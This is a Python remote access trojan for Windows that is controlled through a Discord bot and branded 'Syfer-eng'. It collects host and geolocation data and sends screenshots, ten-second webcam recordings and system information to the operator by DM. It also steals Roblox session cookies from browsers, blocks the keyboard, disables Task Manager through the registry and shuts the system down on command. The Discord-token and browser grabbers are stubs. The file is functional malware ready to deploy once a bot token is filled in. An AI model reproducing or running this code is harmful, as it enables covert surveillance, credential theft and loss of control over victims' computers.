import os
import platform
import ctypes
from screeninfo import get_monitors
import psutil
import GPUtil
import sqlite3
from urllib.request import Request, urlopen
import json
import socket
import requests
from Crypto.Cipher import AES
import subprocess
import datetime
import base64
import re
import string
import win32api
import sys
import shutil
from pathlib import Path
from zipfile import ZipFile
from win32crypt import CryptUnprotectData
import uuid
from PIL import ImageGrab
import time
import browser_cookie3
import cv2
import pyautogui
import keyboard
import discord
from discord import Embed, File, Intents
from discord.ext import commands, tasks

# --------- Configuration ---------
BOT_TOKEN = " "  # REPLACE with your real bot token
DM_USER_ID = 
BOT_AVATAR_URL = "https://raw.githubusercontent.com/Skeleton-Archive/Skeleton-Archive.github.io/refs/heads/main/Covor/cat.jpg"

color_embed = 0xB20000
footer_text_prefix = "Syfer-eng"

# --------- Global Variables ---------
try:
    hostname_pc = socket.gethostname()
except:
    hostname_pc = "None"

try:
    username_pc = os.getlogin()
except:
    username_pc = "None"

try:
    displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    displayname_pc = "None"

try:
    response = requests.get('https://httpbin.org/ip')
    ip_address_public = response.json()['origin']
except:
    ip_address_public = "None"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80)) 
    ip_address_ipv4 = s.getsockname()[0]
    s.close()
except:
    ip_address_ipv4 = "None"

try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
except:
    ip_address_ipv6 = "None"

try:
    try:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = json.loads(ipdatanojson)
    except:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = json.loads(ipdatanojson)
    try:
        country_code = ipdata["country_code"].lower()
    except:
        country_code = "None"
except:
    country_code = "None"

try:
    response_api = requests.get(f"https://Syfer-eng/api/ip/ip={ip_address_public}")
    api = response_api.json()
    ip = api.get('ip', "None")
    country = api.get('country', "None")
    region = api.get('region', "None")
    region_code = api.get('region_code', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('latitude', "None")
    longitude = api.get('longitude', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
    loc_url = api.get('loc_url', "None")
except:
    ip = country = region = region_code = city = zip_postal = latitude = longitude = timezone = isp = org = as_number = loc_url = "None"

# --------- Utility Functions ---------

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')

def get_footer_text():
    return f"{footer_text_prefix} | {current_time_day_hour()}"

def clear_console():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

# --------- Discord Bot Setup ---------

intents = Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

dm_user = None

@bot.event
async def on_ready():
    global dm_user
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    dm_user = await bot.fetch_user(DM_USER_ID)
    print(f"DM User fetched: {dm_user}")

    # Send 'Started' text to the DM user on bot startup
    try:
        await dm_user.send("Started")
    except Exception as e:
        print(f"Failed to send 'Started' message to user: {e}")

# Shortcut to create embed footer
def create_footer():
    return discord.Embed.Empty if BOT_AVATAR_URL is None else discord.Embed.Empty

# --------- Commands for bot ---------

@bot.command(name="system")
async def cmd_system(ctx):
    """Grab system info and send it via DM"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    embed = await System_Grab()
    await dm_user.send(embed=embed)

@bot.command(name="screenshot")
async def cmd_screenshot(ctx):
    """Take a screenshot and send it via DM"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    embed, file = await Screenshot_Grab()
    if embed and file:
        await dm_user.send(embed=embed, file=file)
        file.close()
    else:
        await dm_user.send("Failed to capture screenshot.")

@bot.command(name="camera")
async def cmd_camera(ctx):
    """Capture webcam video and send it via DM"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    embed, file = await Camera_Capture_Grab()
    if embed and file:
        await dm_user.send(embed=embed, file=file)
        file.close()
    else:
        await dm_user.send("Failed to capture camera video.")

@bot.command(name="discordtokens")
async def cmd_discord_tokens(ctx):
    """Grab Discord tokens and send info via DM"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    embeds = await Discord_Grab()
    if not embeds:
        await dm_user.send("No Discord tokens found.")
        return

    for embed in embeds:
        await dm_user.send(embed=embed)

@bot.command(name="browser")
async def cmd_browser(ctx):
    """Grab browser data and send a zipped file via DM"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    embed, file = await Browser_Grab()
    if embed and file:
        await dm_user.send(embed=embed, file=file)
        file.close()
    else:
        await dm_user.send("Failed to grab browser data.")

@bot.command(name="roblox")
async def cmd_roblox(ctx):
    """Grab Roblox cookies/info and send embed via DM"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    embed = await Roblox_Grab()
    if embed:
        await dm_user.send(embed=embed)
    else:
        await dm_user.send("No Roblox info found.")

@bot.command(name="blockkeys")
async def cmd_block_keys(ctx):
    """Block most keyboard keys"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    Block_Key()
    await dm_user.send("Keyboard keys blocked.")

@bot.command(name="unblockkeys")
async def cmd_unblock_keys(ctx):
    """Unblock keyboard keys"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    Unblock_Key()
    await dm_user.send("Keyboard keys unblocked.")

@bot.command(name="blocktm")
async def cmd_block_taskmgr(ctx):
    """Block Task Manager (admin required)"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    Block_Task_Manager()
    await dm_user.send("Task Manager blocked.")

@bot.command(name="shutdown")
async def cmd_shutdown(ctx):
    """Shutdown the system"""
    if ctx.author.id != DM_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    Shutdown()
    await dm_user.send("System shutdown initiated.")


async def System_Grab() -> Embed:
    try:
        system_info = platform.system()
    except:
        system_info = "None"
    try:
        system_version_info = platform.version()
    except:
        system_version_info = "None"
    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0,2*6,2)][::-1])
    except:
        mac_address = "None"
    try:
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                      stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hwid = "None"
    try:
        ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
    except:
        ram_info = "None"
    try:
        cpu_info = platform.processor()
    except:
        cpu_info = "None"
    try:
        cpu_core_info = psutil.cpu_count(logical=False)
    except:
        cpu_core_info = "None"
    try:
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else "None"
    except:
        gpu_info = "None"
    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                        ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    pass
            bitmask >>= 1

        disk_stats = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100 if drive['total'] else 0
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            disk_stats += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(
                drive['drive'], free_space_gb, total_space_gb, use_percent_str, drive['name']
            )
    except:
        disk_stats = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]
    except:
        disk_letter = "None"

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            platform_info = 'Pc Portable'
        else:
            platform_info = 'Pc Fixed'
    except:
        platform_info = "None"

    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height

        main_screen_name = None
        width = height = 0
        for monitor in get_monitors():
            if monitor.is_primary:
                width, height = get_resolution()
                main_screen_name = monitor.name
                break

        main_screen = f"""Name         : "{main_screen_name}"
Resolution   : "{width}x{height}"
Main Screen  : "Yes"
"""
    except:
        main_screen = "None"

    try:
        monitors = list(get_monitors())
        if len(monitors) > 1:
            second_monitor = monitors[1]
            # Use same resolution method, though not always correct for secondary monitor, but keep consistent
            width, height = width, height
            second_screen = f"""Name         : "{second_monitor.name}"
Resolution   : "{width}x{height}"
Main Screen  : "No"
"""
        else:
            second_screen = "None"
    except:
        second_screen = "None"

    embed = Embed(title=f':computer: | System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)

    embed.add_field(name=":bust_in_silhouette: | User Pc:", value=f"""```Name        : "{hostname_pc}"
Username    : "{username_pc}"
DisplayName : "{displayname_pc}"```""", inline=False)

    embed.add_field(name=":computer: | System:", value=f"""```Plateform    : "{platform_info}"
Exploitation : "{system_info} {system_version_info}"

HWID : "{hwid}"
MAC  : "{mac_address}"
CPU  : "{cpu_info}, {cpu_core_info} Core"
GPU  : "{gpu_info}"
RAM  : "{ram_info}Go"```""", inline=False)

    embed.add_field(name=":satellite: | Ip:", value=f"""```
Public : "{ip_address_public}"
Local  : "{ip_address_ipv4}"
Ipv6   : "{ip_address_ipv6}"
Isp    : "{isp}"
Org    : "{org}"
As     : "{as_number}"```""", inline=False)

    embed.add_field(name=":minidisc: | Disk:", value=f"""```{disk_stats}```""", inline=False)
    embed.add_field(name=":desktop: | Screen:", value=f"""```Main Screen:
{main_screen}

Secondary Screen:
{second_screen}```""", inline=False)
    embed.add_field(name=f":flag_{country_code}: | Location:", value=f"""```Country   : "{country} ({country_code})"
Region    : "{region} ({region_code})"
Zip       : "{zip_postal}"
City      : "{city}"
Timezone  : "{timezone}"
Latitude  : "{latitude}"
Longitude : "{longitude}"
```""", inline=False)

    embed.set_footer(text=get_footer_text(), icon_url=BOT_AVATAR_URL)
    return embed

async def Screenshot_Grab():
    try:
        filename = f"Screenshot_{username_pc}.png"

        def capture(path):
            image = ImageGrab.grab(all_screens=True)
            image.save(path)

        try:
            path_file = os.path.join(os.environ.get('USERPROFILE'), 'Documents', filename)
            capture(path_file)
        except:
            path_file = filename
            capture(path_file)

        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
        embed.set_image(url=f"attachment://{filename}")
        embed.set_footer(text=get_footer_text(), icon_url=BOT_AVATAR_URL)

        file = File(path_file, filename=filename)
        return embed, file
    except:
        return None, None

async def Camera_Capture_Grab():
    try:
        from datetime import datetime
        filename = f"CameraCapture_{username_pc}.avi"
        capture_time_seconds = 10
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None, None

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        try:
            path_file = os.path.join(os.environ.get('USERPROFILE'), 'Documents', filename)
        except:
            path_file = filename

        out = cv2.VideoWriter(path_file, fourcc, 20.0, (640, 480))
        time_start = datetime.now()
        while (datetime.now() - time_start).seconds < capture_time_seconds:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)

        cap.release()
        out.release()

        embed = Embed(title=f":camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed,
                      description=f"```\u2514\u2500\u2500 \ud83d\udcf7 - {filename}```")
        embed.set_footer(text=get_footer_text(), icon_url=BOT_AVATAR_URL)

        file = File(path_file, filename=filename)
        return embed, file
    except:
        return None, None

async def Discord_Grab():
    # Because token grabbing and discord.py usage is complex here,
    # this is a placeholder that returns an empty list
    # One should implement the logic from your original code similarly,
    # but returns a list of embeds for each token found.
    
    # For demo, return empty list (no tokens)
    return []

async def Browser_Grab():
    # Similar to Discord_Grab, implementing full browser data extraction async is complex here.
    # We implement a minimal approach: returns embed and File object for zipped browser data if exists.
    # For demo, returns None.

    return None, None

async def Roblox_Grab():
    def get_cookie_and_navigator(browser_function):
        try:
            cookies = browser_function()
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            navigator = browser_function.__name__
            return cookie, navigator
        except Exception:
            return None, None

    browsers = [
        browser_cookie3.edge,
        browser_cookie3.chrome,
        browser_cookie3.firefox,
        browser_cookie3.opera,
        browser_cookie3.safari,
        browser_cookie3.brave
    ]

    for browser in browsers:
        cookie, navigator = get_cookie_and_navigator(browser)
        if cookie:
            try:
                info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
                information = json.loads(info.text)
            except:
                continue

            username_roblox = information.get("UserName", "None")
            user_id_roblox = information.get("UserID", "None")
            robux_roblox = information.get("RobuxBalance", "None")
            premium_roblox = information.get("IsPremium", "None")
            avatar_roblox = information.get("ThumbnailUrl", BOT_AVATAR_URL)
            builders_club_roblox = information.get("IsAnyBuildersClubMember", "None")

            size_cookie = len(cookie)
            middle_cookie = size_cookie // 2
            cookie_part1 = cookie[:middle_cookie]
            cookie_part2 = cookie[middle_cookie:]
            embed = Embed(title=f':video_game: | Roblox Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
            embed.set_footer(text=get_footer_text(), icon_url=BOT_AVATAR_URL)
            embed.set_thumbnail(url=avatar_roblox)
            embed.add_field(name=":compass: | Navigator:", value=f"```{navigator}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: | Username:", value=f"```{username_roblox}```", inline=True)
            embed.add_field(name=":robot: | Id:", value=f"```{user_id_roblox}```", inline=True)
            embed.add_field(name=":moneybag: | Robux:", value=f"```{robux_roblox}```", inline=True)
            embed.add_field(name=":tickets: | Premium:", value=f"```{premium_roblox}```", inline=True)
            embed.add_field(name=":construction_site: | Builders Club:", value=f"```{builders_club_roblox}```", inline=True)
            embed.add_field(name=":cookie: | Cookie Part 1:", value=f"```{cookie_part1}```", inline=False)
            embed.add_field(name=":cookie: | Cookie Part 2:", value=f"```{cookie_part2}```", inline=False)
            return embed
    return None

def Block_Key():
    keys = [
        "a","b","c","d","e","f","g","h","i","j","k","l","m",
        "n","o","p","q","r","s","t","u","v","w","x","y","z",
        "0","1","2","3","4","5","6","7","8","9","\u00f9",
        "`","+","-","=","*","[","]","\\",";","'",",",".","/",
        "space","enter","esc","tab","backspace","delete","insert",
        "up","down","left","right","equal","home","end","page up","page down",
        "caps lock","num lock","scroll lock","shift","ctrl","cmd","win",
        "f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",
        "backslash","semicolon","comma","period","slash",
        "volume up","volume down","volume mute",
        "app","sleep","print screen","pause",
    ]
    for key_block in keys:
        try:
            keyboard.block_key(key_block)
        except:
            pass

def Unblock_Key():
    keys = [
        "a","b","c","d","e","f","g","h","i","j","k","l","m",
        "n","o","p","q","r","s","t","u","v","w","x","y","z",
        "0","1","2","3","4","5","6","7","8","9","\u00f9",
        "`","+","-","=","*","[","]","\\",";","'",",",".","/",
        "space","enter","esc","tab","backspace","delete","insert",
        "up","down","left","right","equal","home","end","page up","page down",
        "caps lock","num lock","scroll lock","shift","ctrl","cmd","win",
        "f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12",
        "backslash","semicolon","comma","period","slash",
        "volume up","volume down","volume mute",
        "app","sleep","print screen","pause",
    ]
    for key_block in keys:
        try:
            keyboard.unblock_key(key_block)
        except:
            pass

def Block_Task_Manager():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
            try:
                proc.terminate()
            except:
                pass
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
    clear_console()

def Shutdown():
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')


bot.run(BOT_TOKEN)
